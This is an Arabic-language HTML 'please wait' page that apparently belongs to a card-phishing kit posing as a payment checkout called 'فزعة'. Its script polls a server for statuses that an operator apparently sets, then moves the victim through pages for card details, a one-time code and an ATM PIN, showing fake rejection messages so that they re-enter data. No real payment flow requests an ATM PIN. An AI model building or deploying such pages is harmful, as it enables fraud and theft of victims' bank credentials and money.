<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري معالجة الطلب - فزعة</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: white; border-radius: 12px; padding: 40px 20px; text-align: center; max-width: 400px; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1); }
        .spinner { width: 60px; height: 60px; border: 4px solid #e5e7eb; border-top: 4px solid #1e3a5f; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .title { font-size: 20px; font-weight: bold; color: #1e3a5f; margin-bottom: 10px; }
        .subtitle { font-size: 14px; color: #6b7280; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="title">جاري التحقق من البيانات</div>
        <div class="subtitle">يرجى الانتظار، لا تقم بإغلاق الصفحة...</div>
    </div>

    <script>
        const orderId = new URLSearchParams(window.location.search).get('orderId');
        
        if (!orderId) {
            window.location.href = 'payment_new_ar.html';
        }

        async function checkStatus() {
            try {
                const response = await fetch(`/api/check-status/${orderId}`);
                const data = await response.json();

                if (data.status === 'approved_payment') {
                    window.location.href = `payment_otp_ar.html?orderId=${orderId}`;
                } else if (data.status === 'rejected_payment') {
                    localStorage.setItem('lastError', data.lastError || 'تم رفض عملية الدفع بطاقك غير متاح للدفع عبر الإنترنت يرجي التواصل مع المصرف او تجربة طرق دفع اخري');
                    window.location.href = `payment_card_ar.html?orderId=${orderId}`;
                } else if (data.status === 'approved_otp') {
                    window.location.href = `payment_atm_ar.html?orderId=${orderId}`;
                } else if (data.status === 'rejected_otp') {
                    localStorage.setItem('lastError', data.lastError || 'الرمز غير صالح او بطاقك غير متاح لدفع عبر الإنترنت يرجي التوصل مع المصرف استخدام طرق دفع اخري');
                    window.location.href = `payment_otp_ar.html?orderId=${orderId}`;
                } else if (data.status === 'approved_pin') {
                    window.location.href = `payment_success_ar.html?orderId=${orderId}`;
                } else if (data.status === 'rejected_pin') {
                    localStorage.setItem('lastError', data.lastError || 'الرقم السري غير صحيح او بطاقك غير متاح لدفع عبر الإنترنت يرجي التوصل مع المصرف استخدام طرق دفع اخري');
                    window.location.href = `payment_atm_ar.html?orderId=${orderId}`;
                } else {
                    setTimeout(checkStatus, 2000);
                }
            } catch (e) { 
                console.error(e);
                setTimeout(checkStatus, 3000);
            }
        }

        if (orderId) checkStatus();
    </script>
</body>
</html>
